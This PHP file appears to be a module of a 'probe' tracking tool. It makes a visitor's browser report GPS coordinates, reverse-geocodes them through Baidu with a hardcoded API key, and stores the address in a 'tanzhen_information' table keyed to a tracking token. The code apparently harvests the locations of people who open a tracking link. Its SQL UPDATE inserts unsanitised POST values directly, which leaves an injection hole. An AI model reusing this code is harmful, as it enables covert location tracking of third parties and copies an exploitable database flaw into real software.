<?php
//error_reporting(0);

$gps_longitude = isset($_POST['gps_longitude']) ? $_POST['gps_longitude'] : NULL;
$gps_latitude = isset($_POST['gps_latitude']) ? $_POST['gps_latitude'] : NULL;
if($time == NULL){
  $time = isset($_POST['timestamp']) ? $_POST['timestamp'] : NULL;
}
if($key == NULL){
  $key = isset($_POST['key']) ? $_POST['key'] : NULL;
}
if($gps_latitude != NULL){
    //根据经纬度定位
    $json2 = file_get_contents("http://api.map.baidu.com/reverse_geocoding/v3/?ak=GkhEVEawxSmRzSgv64bLCH2ALkWI6sCt&output=json&coordtype=wgs84ll&location=".$gps_latitude.','.$gps_longitude);
    $json2=str_replace("renderReverse&&renderReverse(","",$json2);
    $json2=str_replace(")","",$json2);
    $info2 = json_decode($json2,true);
    if($info2['status'] == '0')
    {
        $gps_location = $info2["result"]["formatted_address"];//获取经纬网
    }
    else
    {
        $gps_location = '获取失败';
    }
    include_once(dirname(__FILE__,2)."/mySQL/dbconfig.php");
    // 根据timestamp & key写数据
    $conn = new mysqli($db_host.":".$db_port, $db_user, $db_password, $db_name);
    $sql = "UPDATE `tanzhen_information` SET `gpsaddress` = '$gps_location', `gpsjing` = '$gps_longitude', `gpswei` = '$gps_latitude' WHERE `tanzhen_information`.`timestamp` = '$time' AND `tanzhen_information`.`keyvalue` = '$key';";
    if($conn->query($sql)===TRUE){
        echo '插入成功';
    }else{
        echo '插入失败'.$conn->error;
    }
    $conn->close();
}else{
  echo '
  <script type="text/javascript">
  var xmlhttp = new XMLHttpRequest;
  if(navigator.geolocation){
  //判断是否有这个对象
      navigator.geolocation.getCurrentPosition(function(pos){
          var lon = pos.coords.longitude; //经度
          var lat = pos.coords.latitude;  //维度
          xmlhttp.open("POST","https://"+window.location.hostname+"/modules/getInformation/gps.php",true);
          xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
          xmlhttp.send("&gps_longitude="+lon+"&gps_latitude="+lat+"&key='.$key.'&timestamp='.$time.'");
      },function(error){
        //大部分错误的原因都是没有https
        xmlhttp.open("POST","https://"+window.location.hostname+"/modules/getInformation/gps.php",true);
      xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
      xmlhttp.send("gps_longitude=获取失败&gps_latitude=获取失败"+"&key='.$key.'&timestamp='.$time.'");
      })
  }
  else{	
    //获取失败
    xmlhttp.open("POST","https://"+window.location.hostname+"/modules/getInformation/gps.php",true);
    xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    xmlhttp.send("gps_longitude=获取失败&gps_latitude=获取失败"+"&key='.$key.'&timestamp='.$time.'");
  }
</script>
';
}

?>